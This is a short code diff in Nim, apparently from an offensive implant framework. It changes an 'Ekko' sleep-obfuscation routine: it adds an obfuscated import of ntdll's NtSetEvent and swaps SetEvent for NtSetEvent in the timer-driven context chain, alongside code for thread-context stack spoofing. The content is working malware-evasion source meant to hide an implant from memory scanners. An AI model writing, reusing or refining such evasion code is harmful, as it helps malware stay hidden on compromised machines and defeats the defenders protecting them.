@@ -25,6 +25,7 @@ proc NtCreateEvent*(phEvent: PHANDLE, desiredAccess: ACCESS_MASK, objectAttribut
 proc RtlCreateTimer(queue: HANDLE, hTimer: PHANDLE, function: FARPROC, context: PVOID, dueTime: ULONG, period: ULONG, flags: ULONG): NTSTATUS {.cdecl, stdcall, importc: protect("RtlCreateTimer"), dynlib: protect("ntdll.dll").}
 proc NtSignalAndWaitForSingleObject(hSignal: HANDLE, hWait: HANDLE, alertable: BOOLEAN, timeout: PLARGE_INTEGER): NTSTATUS {.cdecl, stdcall, importc: protect("NtSignalAndWaitForSingleObject"), dynlib: protect("ntdll.dll").}
 proc NtDuplicateObject(hSourceProcess: HANDLE, hSource: HANDLE, hTargetProcess: HANDLE, hTarget: PHANDLE, desiredAccess: ACCESS_MASK, attributes: ULONG, options: ULONG ): NTSTATUS {.cdecl, stdcall, importc: protect("NtDuplicateObject"), dynlib: protect("ntdll.dll").}
+proc NtSetEvent(hEvent: HANDLE, previousState: PLONG): NTSTATUS {.cdecl, stdcall, importc: protect("NtSetEvent"), dynlib: protect("ntdll.dll").}
 
 # Function for retrieving a random thread's thread context for stack spoofing
 proc GetRandomThreadCtx(): CONTEXT = 
@@ -207,8 +208,9 @@ proc sleepEkko*(sleepDelay: int) =
         ctx[8].R9  = cast[DWORD64](addr value)
         
         # ctx[6] contains the call to the SetEvent WinAPI that will set hEventEnd event object in a signaled state. This with signal that the obfuscation chain is complete
-        ctx[9].Rip = cast[DWORD64](SetEvent)
+        ctx[9].Rip = cast[DWORD64](NtSetEvent)
         ctx[9].Rcx = cast[DWORD64](hEventEnd)
+        ctx[9].Rdx = cast[DWORD64](NULL)
 
         # Executing timers
         for i in 0 ..< ctx.len(): 
